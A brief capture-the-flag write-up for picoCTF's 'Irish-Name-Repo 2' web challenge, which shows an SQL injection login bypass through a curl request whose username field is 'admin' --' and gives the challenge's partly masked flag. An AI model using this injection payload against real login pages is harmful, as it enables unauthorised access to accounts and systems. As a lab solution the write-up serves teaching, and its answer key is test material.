# picoCTF – Irish-Name-Repo 2 

* **Category:** Web
* **Points:** 300

## Challenge

>  Do you think you can log us in? Try to see if you can login!

## Solution

Similar to ** Irish-Name-Repo 1 ** make a request to login page using crafterd SQL query.

Using *curl* make a request with username field containing text **admin** followed by **--**. The two hypens will comment out rest of the query which will get executed in the SQL server.
```
curl "<URL>/login.php" -d "username=admin' --&password=&debug=1"
```


```
picoCTF{m0R3_SQL_plz_xxxx}
```
